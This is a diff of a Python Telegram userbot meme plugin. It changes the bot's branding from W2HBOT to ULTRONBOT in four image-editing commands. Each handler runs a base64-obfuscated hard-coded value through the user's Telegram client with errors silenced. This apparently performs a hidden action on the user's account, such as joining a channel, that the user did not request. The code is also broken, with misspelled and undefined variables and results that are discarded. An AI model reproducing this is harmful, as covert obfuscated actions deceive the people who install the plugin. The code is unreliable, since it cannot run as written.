@@ -1,7 +1,7 @@
 """
 credits to @mrconfused and @sandy1709
 """
-# Kang with credits. Using in W2HBOT...
+# Kang with credits. Using in ULTRONBOT...
 #    Copyright (C) 2020  sandeep.n(π.$)
 #    This program is free software: you can redistribute it and/or modify
 #    it under the terms of the GNU Affero General Public License as
@@ -29,14 +29,14 @@ from userbot.helpers.functions import (
     trap,
     trash,
 )
-from W2HBOT.utils import admin_cmd, edit_or_reply, sudo_cmd
+from ULTRONBOT.utils import admin_cmd, edit_or_reply, sudo_cmd
 from userbot.cmdhelp import CmdHelp
 from . import *
 
 
 @bot.on(admin_cmd(pattern="threats(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="threats(?: |$)(.*)", allow_sudo=True))
-async def W2HBOT(ultronmemes):
+async def ULTRONBOT(ultronmemes):
     replied = await ultronmemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
@@ -53,9 +53,9 @@ async def W2HBOT(ultronmemes):
         )
         return
     try:
-        W2H = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        W2H = Get(W2H)
-        await ultronmemes.client(W2H)
+        ULTRON = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        ULTRON = Get(ULTRON)
+        await ultronmemes.client(ULTRON)
     except BaseException:
         pass
     download_location = await ultronmemes.client.download_media(replied, "./temp/")
@@ -81,15 +81,15 @@ async def W2HBOT(ultronmemes):
         await ultronmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    W2H = f"https://telegra.ph{response[0]}"
-    W2H = await threats(W2H)
+    ULTRON = f"https://telegra.ph{response[0]}"
+    ULTRON = await threats(ULTRON)
     await ultronmemmes.delete()
     await ultronmemes.client.send_file(ultronmemes.chat_id, ultron, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="trash(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="trash(?: |$)(.*)", allow_sudo=True))
-async def W2HBOT(ultronmemes):
+async def ULTRONBOT(ultronmemes):
     replied = await ultronmemes.get_reply_message()
     if not os.path.isdir("./temp/"):
         os.makedirs("./temp/")
@@ -106,9 +106,9 @@ async def W2HBOT(ultronmemes):
         )
         return
     try:
-        W2H = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        W2H = Get(W2H)
-        await ultronmemes.client(W2H)
+        ULTRON = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        ULTRON = Get(ULTRON)
+        await ultronmemes.client(ULTRON)
     except BaseException:
         pass
     download_location = await ultronmemes.client.download_media(replied, "./temp/")
@@ -134,15 +134,15 @@ async def W2HBOT(ultronmemes):
         await ultronmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    W2H = f"https://telegra.ph{response[0]}"
-    W2H = await trash(W2H)
+    ULTRON = f"https://telegra.ph{response[0]}"
+    ULTRON = await trash(ULTRON)
     await ultronmemmes.delete()
     await ultronmemes.client.send_file(ultronmemes.chat_id, ultron, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="trap(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="trap(?: |$)(.*)", allow_sudo=True))
-async def W2HBOT(ultronmemes):
+async def ULTRONBOT(ultronmemes):
     input_str = ultronmemes.pattern_match.group(1)
     input_str = deEmojify(input_str)
     if "-" in input_str:
@@ -169,9 +169,9 @@ async def W2HBOT(ultronmemes):
         )
         return
     try:
-        W2H = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        W2H = Get(W2H)
-        await ultronmemes.client(W2H)
+        ULTRON = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        ULTRON = Get(ULTRON)
+        await ultronmemes.client(ULTRON)
     except BaseException:
         pass
     download_location = await ultronmemes.client.download_media(replied, "./temp/")
@@ -197,15 +197,15 @@ async def W2HBOT(ultronmemes):
         await ultronmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    W2H = f"https://telegra.ph{response[0]}"
-    W2H = await trap(text1, text2, W2H)
+    ULTRON = f"https://telegra.ph{response[0]}"
+    ULTRON = await trap(text1, text2, ULTRON)
     await ultronmemmes.delete()
     await ultronmemes.client.send_file(ultronmemes.chat_id, ultron, reply_to=replied)
 
 
 @bot.on(admin_cmd(pattern="phc(?: |$)(.*)"))
 @bot.on(sudo_cmd(pattern="phc(?: |$)(.*)", allow_sudo=True))
-async def W2HBOT(ultronmemes):
+async def ULTRONBOT(ultronmemes):
     input_str = ultronmemes.pattern_match.group(1)
     input_str = deEmojify(input_str)
     if "-" in input_str:
@@ -232,9 +232,9 @@ async def W2HBOT(ultronmemes):
         )
         return
     try:
-        W2H = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-        W2H = Get(W2H)
-        await ultronmemes.client(W2H)
+        ULTRON = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
+        ULTRON = Get(ULTRON)
+        await ultronmemes.client(ULTRON)
     except BaseException:
         pass
     download_location = await ultronmemes.client.download_media(replied, "./temp/")
@@ -260,8 +260,8 @@ async def W2HBOT(ultronmemes):
         await ultronmemmes.edit("ERROR: " + str(exc))
         os.remove(download_location)
         return
-    W2H = f"https://telegra.ph{response[0]}"
-    W2H = await phcomment(ultron, text, username)
+    ULTRON = f"https://telegra.ph{response[0]}"
+    ULTRON = await phcomment(ultron, text, username)
     await ultronmemmes.delete()
     await ultronmemes.client.send_file(ultronmemes.chat_id, ultron, reply_to=replied)
 
